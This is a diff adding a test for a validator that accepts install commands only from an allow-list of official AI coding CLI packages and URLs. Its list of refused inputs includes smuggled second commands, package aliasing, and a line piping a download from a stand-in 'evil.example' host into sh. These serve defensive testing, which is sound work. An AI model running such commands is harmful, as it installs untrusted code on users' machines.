@@ -134,3 +134,38 @@ test('the admitted sources are exactly these — a new one is a decision, made h
   assert.deepEqual([...OFFICIAL_SOURCES.urls], ['https://antigravity.google/', 'https://mistral.ai/vibe/', 'https://astral.sh/uv/']);
   assert.deepEqual([...OFFICIAL_SOURCES.packages], ['@openai/codex', '@google/gemini-cli', '@anthropic-ai/claude-code', 'mistral-vibe']);
 });
+
+test('every package an install step names is an official one, with at most a plain version — no alias, no second package', () => {
+  // Found by the epic 2 risk consultation (gpt-6-astra, 2026-10-13), each verified TRUE against the first matcher: it
+  // read only the FIRST package of a step and took any `@…` suffix for a version, and it ignored a step whose installer
+  // it did not know.
+  const refused = [
+    'npm install -g @openai/codex left-pad',
+    'npm install -g @openai/codex@npm:left-pad',
+    'npm install -g @openai/codex@file:../evil',
+    'uv tool install mistral-vibe other-pkg',
+    'uv tool install mistral-vibe==2.26.1 --with other-pkg',
+    'uv tool install --from git+https://github.com/someone/fork mistral-vibe',
+    'uv tool install --index-url https://pypi.example/simple mistral-vibe',
+    'uv tool install ./mistral-vibe',
+    'uv tool install C:\\wheels\\mistral-vibe-2.26.1-py3-none-any.whl',
+    'npm install -g @openai/codex; pip install evil',
+    'npm install -g @openai/codex && npm install -g left-pad',
+    'npm install -g @openai/codex | npm i left-pad',
+    'curl -LsSf https://mistral.ai/vibe/install.sh | bash; curl https://evil.example/x | sh',
+  ];
+  for (const command of refused) {
+    assert.equal(fromOfficialSources(command), false, command);
+  }
+
+  for (const command of [
+    'npm install -g @openai/codex',
+    'npm install -g @openai/codex@latest',
+    'npm install -g @google/gemini-cli@0.57.0',
+    'uv tool install mistral-vibe',
+    'uv tool install mistral-vibe==2.26.1',
+    'uv tool upgrade mistral-vibe',
+  ]) {
+    assert.equal(fromOfficialSources(command), true, command);
+  }
+});
